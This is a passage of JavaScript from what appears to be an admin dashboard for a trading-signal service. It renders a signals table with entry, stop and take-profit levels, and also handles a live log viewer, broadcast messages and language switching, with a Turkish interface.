      info.textContent = `Toplam ${r.total} kullanıcı · Sayfa ${page + 1}`;
    }
  } catch (e) {
    tbody.innerHTML = `<tr><td colspan="5" class="empty" style="color:var(--accent-red)">Hata: ${e.message}</td></tr>`;
  }
}

async function loadSignals() {
  const tbody = document.getElementById("signals-tbody");
  if (!tbody) return;
  tbody.innerHTML = '<tr><td colspan="11" class="empty">Yükleniyor…</td></tr>';
  try {
    const r = await api("/api/admin/signals");
    tbody.innerHTML = "";
    if (!r.signals || !r.signals.length) {
      tbody.innerHTML = '<tr><td colspan="11" class="empty">Henüz sinyal bulunmuyor</td></tr>';
      return;
    }
    r.signals.forEach(s => {
      const tr = document.createElement("tr");
      tr.style.borderBottom = "1px solid rgba(255,255,255,0.05)";
      const isLong = s.side === "LONG" || s.side === "BUY";
      const icon = isLong ? "🟢" : "🔴";
      const isClosed = s.status === "closed";
      const isWin = s.r_result > 0;
      
      let statusBadge = "";
      if (!isClosed) {
        statusBadge = '<span class="badge green">AÇIK ⏳</span>';
      } else if (s.reason === "tp3" || s.tp_hit >= 3) {
        statusBadge = '<span class="badge green">🎯 TP3</span>';
      } else if (s.reason === "tp2" || s.tp_hit === 2) {
        statusBadge = '<span class="badge green">🎯 TP2</span>';
      } else if (s.reason === "tp1" || s.tp_hit === 1) {
        statusBadge = '<span class="badge green">🎯 TP1</span>';
      } else if (s.reason === "be" || s.reason === "breakeven") {
        statusBadge = '<span class="badge gold">🛡️ Breakeven</span>';
      } else {
        statusBadge = '<span class="badge red">🛑 Stop</span>';
      }

      const tp23Str = (s.tp2 ? s.tp2 : '—') + ' / ' + (s.tp3 ? s.tp3 : '—');

      tr.innerHTML = `
        <td style="padding:8px 10px;font-size:11px;color:var(--text-muted);white-space:nowrap">${s.date || '—'}</td>
        <td style="padding:8px 10px"><strong>${s.symbol}</strong></td>
        <td style="padding:8px 10px"><span class="badge">${s.tf}</span></td>
        <td style="padding:8px 10px;font-weight:700;color:${isLong ? 'var(--accent-green)' : 'var(--accent-red)'}">${icon} ${s.side}</td>
        <td style="padding:8px 10px;font-family:monospace">${s.entry?.toFixed(4) || '—'}</td>
        <td style="padding:8px 10px;font-family:monospace;color:#ff7878">${s.sl?.toFixed(4) || '—'}</td>
        <td style="padding:8px 10px;font-family:monospace;color:var(--accent-green)">${s.tp1?.toFixed(4) || '—'}</td>
        <td style="padding:8px 10px;font-size:11px;font-family:monospace;color:#4ade80">${tp23Str}</td>
        <td style="padding:8px 10px;font-family:monospace;color:#38bdf8">${s.exit_price ? s.exit_price.toFixed(4) : '—'}</td>
        <td style="padding:8px 10px;font-weight:700;color:${s.r_result >= 0 ? 'var(--accent-green)' : 'var(--accent-red)'}">${s.r_result >= 0 ? '+' : ''}${s.r_result.toFixed(2)}R</td>
        <td style="padding:8px 10px">${statusBadge}</td>
      `;
      tbody.appendChild(tr);
    });
  } catch (e) {
    tbody.innerHTML = `<tr><td colspan="11" class="empty" style="color:var(--accent-red)">Hata: ${e.message}</td></tr>`;
  }
}

document.getElementById("btn-refresh-signals")?.addEventListener("click", loadSignals);

// --- Canlı Log Viewer
let autoRefresh = false;
let autoRefreshTimer = null;
async function loadLogs() {
  try {
    const r = await api("/api/admin/logs");
    const box = document.getElementById("log-box");
    if (box) {
      box.textContent = (r.lines || []).join("\n");
      box.scrollTop = box.scrollHeight;
    }
  } catch (e) {
    console.warn("Log hatası:", e);
  }
}

function toggleAutoRefresh() {
  autoRefresh = !autoRefresh;
  const btn = document.getElementById("btn-auto-refresh");
  const dict = ADM_I18N[currentLang] || ADM_I18N.tr;
  if (btn) {
    btn.textContent = autoRefresh ? dict.btn_stop_refresh : dict.btn_auto_refresh;
  }
  if (autoRefresh) {
    autoRefreshTimer = setInterval(loadLogs, 4000);
  } else {
    clearInterval(autoRefreshTimer);
  }
}

document.getElementById("btn-refresh-logs")?.addEventListener("click", loadLogs);
document.getElementById("btn-auto-refresh")?.addEventListener("click", toggleAutoRefresh);

// --- Broadcast (Yayın) Gönderimi
document.getElementById("btn-broadcast")?.addEventListener("click", async () => {
  const text = document.getElementById("broadcast-text")?.value.trim();
  if (!text) return toast("Lütfen yayın metni girin", "error");
  const btn = document.getElementById("btn-broadcast");
  btn.disabled = true;
  try {
    await api("/api/admin/broadcast", { message: text, text: text });
    toast("Yayın kuyruğa eklendi, kullanıcılara iletiliyor! 📢", "success");
    document.getElementById("broadcast-text").value = "";
  } catch (e) {
    toast("Yayın hatası: " + e.message, "error");
  } finally {
    btn.disabled = false;
  }
});

// --- Dil Seçim Modalı
const admLangModal = document.getElementById("adm-lang-modal");
document.getElementById("btn-adm-lang")?.addEventListener("click", () => {
  if (admLangModal) admLangModal.style.display = "flex";
});
document.getElementById("btn-close-adm-lang")?.addEventListener("click", () => {
  if (admLangModal) admLangModal.style.display = "none";
});
admLangModal?.addEventListener("click", e => {
  if (e.target === admLangModal) admLangModal.style.display = "none";
});

document.querySelectorAll("#adm-lang-modal [data-lang]").forEach(btn => {
  btn.addEventListener("click", () => {
    const lang = btn.getAttribute("data-lang");
    applyAdminLanguage(lang);
    if (admLangModal) admLangModal.style.display = "none";
    toast(`Dil / Language: ${lang.toUpperCase()}`, "success");
  });
});

// Başlangıç
const backLink = document.querySelector('a[href="index.html"]');
if (backLink) {
  const curApi = getApiBase();
  if (curApi) backLink.href = `index.html?api=${encodeURIComponent(curApi)}`;
}
load();
